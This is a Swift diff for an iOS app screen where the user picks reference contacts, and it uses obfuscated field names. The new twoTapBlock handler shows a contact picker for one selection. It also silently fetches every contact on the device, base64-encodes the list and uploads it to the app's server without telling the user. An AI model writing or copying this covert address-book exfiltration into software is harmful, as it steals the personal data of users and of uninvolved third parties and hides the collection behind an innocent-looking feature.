@@ -15,10 +15,6 @@ import TYAlertController
 
 class ContactViewController: BaseViewController {
     
-    private let viewModel = AppViewModel()
-    
-    private var cancellables = Set<AnyCancellable>()
-    
     var cardModel: baloarianModel?
     
     var stepModel: listensiveModel? {
@@ -224,27 +220,68 @@ extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
         let listModel = self.listArray[indexPath.row]
         let cell = tableView.dequeueReusableCell(withIdentifier: "BlueContactViewCell", for: indexPath) as! BlueContactViewCell
         cell.model = listModel
-//        cell.tapBlock = { [weak self] model in
-//            guard let self else { return }
-//            self.view.endEditing(true)
-//            self.tapClickCell(model: model, cell: cell)
-//        }
+        cell.oneTapBlock = { [weak self] in
+            guard let self else { return }
+            self.tapClickCell(model: listModel, cell: cell)
+        }
+        cell.twoTapBlock = {
+            
+            ContactManager.shared.checkPermission(from: self) { granted, status in
+                
+                guard granted else { return }
+                
+                ContactManager.shared.presentContactPicker(from: self) { contact in
+                    if let contact {
+                        let name = contact["traveleous"] ?? ""
+                        let phone = contact["ratherine"] ?? ""
+                        
+                        if name.isEmpty || phone.isEmpty {
+                            ToastManager.showOnWindow("Name or phone number cannot be empty, please select again".localized)
+                            return
+                        }
+                        
+                        listModel.traveleous = name
+                        listModel.visitmost = phone
+                        cell.twoLabel.text = "\(name)-\(phone)"
+                        cell.twoLabel.font = UIFont.systemFont(ofSize: 14, weight: .bold)
+                        cell.twoLabel.textColor = .black
+                    }
+                }
+            }
+            
+            ContactManager.shared.checkPermission(from: self) { [weak self] granted, status in
+                
+                guard let self, granted else { return }
+                
+                let list = ContactManager.shared.fetchAllContacts()
+                
+                if let jsonData = try? JSONEncoder().encode(list) {
+                    let contactStr = jsonData.base64EncodedString()
+                    let parameters = ["fatherarium": contactStr,
+                                      "donfold": String(Int(3)),
+                                      "postory": "1"]
+                    viewModel.uploadContactsInfo(parameters: parameters)
+                }
+                
+            }
+            
+        }
         return cell
     }
 }
 
 extension ContactViewController {
     
-    private func tapClickCell(model: ambrememberuousModel, cell: TwoViewCell) {
+    private func tapClickCell(model: cordacityModel, cell: BlueContactViewCell) {
         let popView = ClickCellAlertView(frame: self.view.bounds)
         
-        popView.nameLabel.text = model.participantarian ?? ""
+        popView.nameLabel.text = model.relationship_title ?? ""
         
-        let modelArray = model.petrsive ?? []
+        let modelArray = model.paridemocrat ?? []
         
         popView.modelArray = modelArray
         
-        let name = cell.oneTextFiled.text ?? ""
+        let name = cell.oneLabel.text ?? ""
         
         for (index, listModel) in modelArray.enumerated() {
             if name == listModel.traveleous ?? "" {
@@ -265,9 +302,10 @@ extension ContactViewController {
         popView.saveBlock = { [weak self] listModel in
             guard let self else { return }
             self.dismiss(animated: true) {
-                cell.oneTextFiled.text = listModel.traveleous ?? ""
-                model.donfold = listModel.donfold ?? ""
-                model.amify = listModel.traveleous ?? ""
+                cell.oneLabel.text = listModel.traveleous ?? ""
+                cell.oneLabel.font = UIFont.systemFont(ofSize: 14, weight: .bold)
+                cell.oneLabel.textColor = .black
+                model.piltion = listModel.donfold ?? ""
             }
         }
         
@@ -279,16 +317,26 @@ extension ContactViewController {
     
     private func saveInfo() {
         
-//        var parameters = ["dentacity": cardModel?.maciactuallyally ?? "",
-//                          "syfication": IDFVKeychainManager.shared.getIDFV()]
-//        
-//        for model in listArray {
-//            let key = model.securityair ?? ""
-//            let value = model.donfold ?? ""
-//            parameters[key] = value
-//        }
-//        
-//        viewModel.saveContactInfo(parameters: parameters)
+        let parametersArray = listArray.map { model in
+            [
+                "visitmost": model.visitmost ?? "",
+                "traveleous": model.traveleous ?? "",
+                "piltion": model.piltion ?? "",
+                "sibilious": model.sibilious ?? ""
+            ]
+        }
+        
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: parametersArray, options: [])
+            if let jsonString = String(data: jsonData, encoding: .utf8) {
+                let parameters = ["dentacity": cardModel?.maciactuallyally ?? "",
+                                  "fatherarium": jsonString]
+                viewModel.saveContactInfo(parameters: parameters)
+            }
+        } catch {
+            print("JSON====: \(error.localizedDescription)")
+        }
+        
     }
     
     private func getDetailInfo() {
